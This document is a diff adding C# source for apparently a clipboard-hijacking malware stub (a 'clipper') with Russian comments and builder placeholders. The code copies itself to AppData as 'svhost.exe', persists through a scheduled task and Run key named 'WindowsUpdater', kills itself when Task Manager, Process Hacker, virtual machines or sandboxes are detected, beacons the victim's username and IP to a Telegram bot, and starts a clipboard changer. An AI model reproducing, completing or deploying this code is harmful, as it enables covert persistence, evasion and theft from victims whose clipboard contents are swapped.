+        [DllImport("kernel32.dll")]
+        internal static extern bool GlobalUnlock(IntPtr hMem);
+
+#endregion
+
+#region For ClipBoard SetText
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr GetOpenClipboardWindow();
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
+
+#endregion
+
+#region For ClipMonitor
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        internal static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        internal static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        internal static extern IntPtr SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
+
+#endregion
+    }
+    class Program
+    {
+#if AntiTask
+        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
+        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        static void CheckTask()
+        {
+            while (true)
+            {
+                Process[] procs = Process.GetProcesses(); foreach (Process p in procs)
+                {
+                    if ((Process.GetProcessesByName("taskmgr").Length > 0 || Process.GetProcessesByName("Taskmgr").Length > 0 || Process.GetProcessesByName("ProcessHacker").Length > 0) || Environment.HasShutdownStarted || FindWindow("", "Task Manager") != IntPtr.Zero || FindWindow("", "Диспетчер задач") != IntPtr.Zero)
+                    {
+
+                        Process.GetCurrentProcess().Kill(); // Закрываемся
+                    }
+                }
+                Thread.Sleep(1000); // Как часто проверяем на диспетчеры (1 сек)
+            }
+        }
+#endif
+        public static string FileNameDir = Environment.GetEnvironmentVariable("AppData") + "\\Microsoft";
+        public static string FileName = "svhost.exe";
+        public static string CurentFileName = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
+
+#if STARTUP
+       
+
+        public static void AntiKill()
+        {
+            var startInfo = new ProcessStartInfo();
+            startInfo.FileName = "schtasks.exe"; startInfo.UseShellExecute = true; startInfo.CreateNoWindow = false; startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.Arguments = @"/create /sc MINUTE /mo 1 /tn ""WindowsUpdater"" /tr """ + Program.FileNameDir + "\\" + Program.FileName + @""" /f";
+            Process.Start(startInfo);
+            Process.Start(Program.FileNameDir + "\\" + Program.FileName);
+            Process.GetCurrentProcess().Kill();
+        }
+        private static void Auto()
+        {
+            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            {
+                registryKey.SetValue("WindowsUpdater", Program.FileNameDir + "\\" + Program.FileName);
+            }
+        }
+        public static void Copy()
+        {
+            try
+            {
+                if (!Directory.Exists(Program.FileNameDir))
+                {
+                    Directory.CreateDirectory(Program.FileNameDir);
+                }
+                if (!File.Exists(Program.FileNameDir + "\\" + Program.FileName))
+                {
+                    File.Copy(Assembly.GetExecutingAssembly().Location, Program.FileNameDir + "\\" + Program.FileName);
+                }
+            }
+            catch
+            {
+            }
+        }
+#endif
+        static Mutex InstanceCheckMutex;
+        static bool InstanceCheck()
+        {
+            bool isNew;
+            InstanceCheckMutex = new Mutex(true, "UNIC_KEY", out isNew);
+            return isNew;
+        }
+        static void Main(string[] args)
+        {
+            if (!InstanceCheck())
+            {
+                Process.GetCurrentProcess().Kill();
+            }
+            else
+            {
+
+
+
+#if VM
+                if (DetectVM())
+                    Process.GetCurrentProcess().Kill();
+#endif
+
+#if TG
+                if (Program.CurentFileName !=  Program.FileName)
+                {
+               using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "🔥<strong> Новый запуск! </strong>🔥" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+                }
+#endif
+
+#if LOGGER
+                
+            Logger(IP, "Ex");
+#endif
+#if STARTUP
+                if (Program.CurentFileName !=  Program.FileName)
+                {
+
+                    Copy();
+                    Auto();
+                    AntiKill();
+
+                    Process.GetCurrentProcess().Kill();
+                }
+                else
+                {
+                ClipChanger.StartChanger();
+                }
+#else
+                ClipChanger.StartChanger();
+#endif
+#if AntiTask
+                CheckTask();
+#endif
+            }
+        }
+#if VM
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string running);
+        static bool DetectVM()
+        {
+            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                            || manufacturer.Contains("vmware")
+                            || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
+                   || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
+                   GetModuleHandle("snxhk.dll").ToInt32() != 0)
+                        {
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+#endif
+
+        static string IP = "[IP]";
+        public static void Logger(string adr, string res)
+        {
+
+            try
+            {
+                string ipLogLink = adr;
+                string respon = res;
+
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(ipLogLink);
+
+                req.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
+                req.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
+
+                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+
+                using (StreamReader stream = new StreamReader(
+                     resp.GetResponseStream(), Encoding.UTF8))
+                {
+                    respon = stream.ReadToEnd();
+
+                    if (respon != "" || respon != String.Empty)
+                    {
+
+                    }
+                }
+
+            }
+            catch (Exception)
+            {
+
+            }
+
+        }
+        public static void Telegram(string chatID, string api, string proxy, string text)
+        {
+            string url = "https://api.telegram.org/bot" + api + "/sendMessage";
+            using (var webClient = new WebClient())
+            {
+                try
+                {
+                    if (proxy != "")
+                    {
+                        WebProxy wp = new WebProxy(proxy); //Прокси
+                        webClient.Proxy = wp;
+                        webClient.Credentials = new NetworkCredential(BoxClipText.Decrypt("[user]", true), BoxClipText.Decrypt("[password]", true));
+                    }
+                    var pars = new NameValueCollection();
+                    pars.Add("parse_mode", "html");
+                    pars.Add("chat_id", chatID); // "361694810"
+                    pars.Add("text", text);
+
+                    var response = webClient.UploadValues(url, pars);
+                    string str = System.Text.Encoding.UTF8.GetString(response);
+                }
+                catch (Exception)
+                {
+
+                }
+            }
+        }
+
+    }
+}
